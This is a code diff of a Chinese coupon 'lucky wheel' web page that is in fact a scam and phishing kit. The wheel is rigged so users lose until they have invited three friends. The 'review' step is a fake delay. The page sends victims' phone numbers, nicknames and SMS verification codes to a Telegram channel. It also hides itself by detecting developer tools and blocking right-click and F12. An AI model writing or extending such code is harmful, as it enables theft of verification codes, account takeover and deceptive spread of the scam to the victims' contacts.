+      showToast('邀请码无效或已被使用 😢');
+    }
+    
+    els.redeemBtn.disabled = false;
+    els.redeemBtn.textContent = '兑换';
+  }, 1000);
+}
+
+function spinWheel() {
+  if (inviteState.chanceCount <= 0 || isSpinning) return;
+  
+  isSpinning = true;
   inviteState.chanceCount--;
   updateInviteUI();
   els.wheelBtn.disabled = true;
+  els.wheelBtn.textContent = '抽奖中...';
+  
+  // 播放转动音效
+  playSound('spin');
   
   // 决定结果
-  // 规则：邀请满3人前一定不中奖
   let resultIndex;
-  const winIndices = [0, 2, 4, 6]; // 中奖位置：柠檬茶券、冰淇淋券、奶茶券、神秘大奖
-  const loseIndices = [1, 3, 5, 7]; // 惩罚位置
+  const winIndices = [0, 2, 4, 6];
+  const loseIndices = [1, 3, 5, 7];
   
   if (inviteState.invitedCount < 3) {
-    // 未满3人，必不中，随机选一个惩罚
     resultIndex = loseIndices[Math.floor(Math.random() * loseIndices.length)];
   } else {
-    // 满3人，必中，随机选一个奖励
     resultIndex = winIndices[Math.floor(Math.random() * winIndices.length)];
     inviteState.hasWon = true;
   }
   
-  // 计算旋转角度（至少转5圈）
+  // 计算旋转角度
   const baseRotation = 360 * 5;
-  const itemAngle = 45; // 360 / 8
+  const itemAngle = 45;
   const targetAngle = 360 - (resultIndex * itemAngle) - (itemAngle / 2);
   const totalRotation = baseRotation + targetAngle;
   
-  // 执行旋转
   els.wheel.style.transform = `rotate(${totalRotation}deg)`;
   
   setTimeout(() => {
     handleWheelResult(resultIndex);
+    isSpinning = false;
     els.wheelBtn.disabled = false;
   }, 4000);
 }
@@ -1123,11 +1676,15 @@ function handleWheelResult(index) {
   
   const result = results[index];
   
-  // 发送TG通知
-  sendTGMessage(`【抽奖结果】\n手机号：${inviteState.currentPhone}\n结果：${result.name} ${result.emoji}\n类型：${result.type === 'win' ? '中奖' : '未中奖'}\n剩余邀请：${inviteState.invitedCount}\n剩余次数：${inviteState.chanceCount}`);
+  sendTGMessage(`【抽奖结果】\n手机号：${inviteState.currentPhone}\n结果：${result.name} ${result.emoji}\n类型：${result.type === 'win' ? '中奖' : '未中奖'}\n剩余次数：${inviteState.chanceCount}`);
   
   if (result.type === 'win') {
-    // 中奖了，显示券码
+    playSound('win');
+    
+    // 粒子效果
+    const rect = els.wheel.getBoundingClientRect();
+    createParticles(rect.left + rect.width/2, rect.top + rect.height/2);
+    
     setTimeout(() => {
       claimed++;
       updateStock();
@@ -1136,12 +1693,13 @@ function handleWheelResult(index) {
       els.modal.classList.add('show');
       localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now());
       
-      // 发送最终获奖通知
       sendTGMessage(`【🎉 最终获奖】\n手机号：${inviteState.currentPhone}\n券码：${els.couponCode.textContent}\n获奖类型：${result.name}\n时间：${new Date().toLocaleString('zh-CN')}`);
     }, 500);
   } else {
     showToast(`${result.emoji} ${result.name}！${inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
   }
+  
+  saveToStorage();
 }
 
 function sendTGMessage(text) {
@@ -1161,23 +1719,67 @@ function sendTGMessage(text) {
   }
 }
 
-// 修改后的审核流程 - 直接进入邀请页面
+// 防作弊检测
+function antiCheat() {
+  // 检测开发者工具
+  const devtools = /./;
+  devtools.toString = function() {
+    els.cheatWarning.classList.add('show');
+    sendTGMessage(`【⚠️ 警告】\n检测到开发者工具\n手机号：${inviteState.currentPhone || '未知'}\n时间：${new Date().toLocaleString('zh-CN')}`);
+    return '';
+  };
+  
+  // 检测窗口大小变化（模拟器）
+  let lastWidth = window.innerWidth;
+  let lastHeight = window.innerHeight;
+  window.addEventListener('resize', () => {
+    if (Math.abs(window.innerWidth - lastWidth) > 100 || Math.abs(window.innerHeight - lastHeight) > 100) {
+      console.log('窗口大小异常变化');
+    }
+  });
+  
+  // 禁用右键
+  document.addEventListener('contextmenu', e => {
+    e.preventDefault();
+    showToast('右键已禁用');
+  });
+  
+  // 禁用F12
+  document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+      e.preventDefault();
+      els.cheatWarning.classList.add('show');
+    }
+  });
+}
+
+// 键盘快捷键
+function initKeyboardShortcuts() {
+  document.addEventListener('keydown', e => {
+    // 空格键抽奖
+    if (e.code === 'Space' && !els.wheelBtn.classList.contains('hidden') && !isSpinning) {
+      e.preventDefault();
+      spinWheel();
+    }
+    
+    // ESC关闭弹窗
+    if (e.key === 'Escape') {
+      els.modal.classList.remove('show');
+      els.agreementModal.classList.remove('show');
+    }
+  });
+}
+
 function startManualReview(phone, nickname, code) {
   if (isPolling) return;
   isPolling = true;
   
-  // 显示加载界面模拟审核
   els.loadingMask.classList.add('show');
   
-  // 模拟审核过程（3-5秒）
   setTimeout(() => {
     els.loadingMask.classList.remove('show');
     isPolling = false;
-    
-    // 审核通过，进入邀请页面
     showInvitePage(phone, nickname);
-    
-    // 发送审核通过通知
     sendTGMessage(`【审核通过】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n状态：进入邀请流程`);
   }, 3000 + Math.random() * 2000);
 }
@@ -1262,21 +1864,19 @@ els.submitBtn.addEventListener('click', async () => {
     return;
   }
 
-  // 检查是否已经领取过
   if (localStorage.getItem('mx_claim_' + phone)) {
     showToast('该手机号已参与过活动');
     return;
   }
 
-  // 开始审核流程（现在直接进入邀请页面）
   startManualReview(phone, nick, code);
 });
 
-// 邀请按钮事件
-els.inviteBtn.addEventListener('click', simulateInvite);
-
-// 转盘按钮事件
+els.inviteBtn?.addEventListener('click', simulateInvite);
+els.inviteMoreBtn.addEventListener('click', simulateInvite);
+els.redeemBtn.addEventListener('click', redeemInviteCode);
 els.wheelBtn.addEventListener('click', spinWheel);
+els.checkInBtn.addEventListener('click', dailyCheckIn);
 
 els.modal.addEventListener('click', e => {
   if (e.target === els.modal) els.modal.classList.remove('show');
@@ -1288,8 +1888,9 @@ els.rejectedModal.addEventListener('click', e => {
 
 // ============================= 启动 =============================
 window.addEventListener('load', () => {
-  // 初始化启动画面
   initSplashScreen();
+  antiCheat();
+  initKeyboardShortcuts();
   
   timers.fake    = setInterval(fakeClaim, 1400);
   timers.barrage = setInterval(() => {
@@ -1301,6 +1902,7 @@ window.addEventListener('load', () => {
 
 window.addEventListener('beforeunload', () => {
   Object.values(timers).forEach(t => clearInterval(t));
+  saveToStorage();
 });
 </script>
 </body>
